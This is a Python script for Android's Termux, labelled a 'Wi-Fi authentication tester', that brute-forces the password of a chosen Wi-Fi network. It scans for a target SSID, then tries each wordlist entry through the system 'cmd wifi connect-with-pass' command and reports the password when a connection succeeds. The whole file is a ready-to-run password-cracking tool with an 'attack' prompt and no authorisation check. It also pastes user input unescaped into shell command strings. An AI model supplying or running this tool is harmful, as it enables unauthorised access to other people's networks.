import os
import time
import subprocess

# Professional Terminal Colors
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'
BOLD = '\033[1m'
BLUE = '\033[94m'

def banner():
    os.system('clear')
    print(f"{RED}{BOLD}" + "="*45)
    print("        WI-FI AUTHENTICATION TESTER")
    print("="*45 + f"{RESET}")
    print(f"      {GREEN}Developed By: Bayazid Habib{RESET}")
    print(f"      {BLUE}Engine: Termux-API Standalone{RESET}\n")

def check_target(ssid):
    print(f"[*] Scanning for: {ssid}...")
    try:
        scan = subprocess.check_output('termux-wifi-scaninfo', shell=True).decode()
        if ssid in scan:
            print(f"{GREEN}[+] {ssid} is in range.{RESET}")
            return True
        else:
            print(f"{RED}[!] Error: {ssid} not found.{RESET}")
            return False
    except Exception:
        print(f"{RED}[-] Scan failed! Ensure Termux-API and Location are ON.{RESET}")
        return False

def start():
    banner()
    
    while True:
        cmd = input(f"{BOLD}Type 'attack' to start: {RESET}").lower()
        if cmd == "attack":
            break

    target_ssid = input("[+] Target SSID: ")
    if not check_target(target_ssid):
        return

    wordlist = input("[+] Wordlist Path: ")
    if not os.path.exists(wordlist):
        print(f"{RED}[-] Wordlist not found!{RESET}")
        return

    try:
        with open(wordlist, 'r') as f:
            lines = f.readlines()
            print(f"\n{GREEN}[*] Testing connection for: {target_ssid}{RESET}")
            
            for i, pwd in enumerate(lines, 1):
                password = pwd.strip()
                if len(password) < 8: continue
                
                print(f"[*] Attempt [{i}/{len(lines)}]: {password}", end='\r')
                
                os.system(f'cmd wifi connect-with-pass "{target_ssid}" "{password}"')
                time.sleep(3)
                
                try:
                    check = subprocess.check_output('termux-wifi-connectioninfo', shell=True).decode()
                    if target_ssid in check and "ip_address" in check:
                        print(f"\n\n{GREEN}{BOLD}[+] SUCCESS! Password: {password}{RESET}")
                        return
                except:
                    pass
                
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Stopped by user.{RESET}")

if __name__ == "__main__":
    start()
